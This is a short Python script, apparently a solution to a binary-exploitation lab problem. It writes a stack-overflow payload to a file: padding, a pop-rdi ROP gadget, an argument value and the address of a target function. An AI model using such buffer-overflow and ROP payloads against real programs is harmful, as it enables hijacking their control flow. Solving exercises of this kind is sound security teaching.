import struct

# ================= 配置区 =================
# 1. Padding 长度 (同 Problem 1)
padding_length = 16

# 2. Gadget 地址 (pop %rdi; ret)
# 注意：看汇编 4012c7 处是 5f (pop rdi)
gadget_address = 0x4012c7 

# 3. 参数值 (0x3f8)
arg_value = 0x3f8

# 4. 目标函数 func2 地址
target_address = 0x401216
# ==========================================

# 构造 Payload
payload = b'A' * padding_length
payload += struct.pack('<Q', gadget_address) # 第一步：跳去 Gadget
payload += struct.pack('<Q', arg_value)      # 第二步：这是给 Gadget 吃的参数
payload += struct.pack('<Q', target_address) # 第三步：跳去 func2

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated for Problem 2!")
print(f"Chain: Padding -> pop_rdi ({hex(gadget_address)}) -> 0x3f8 -> func2 ({hex(target_address)})")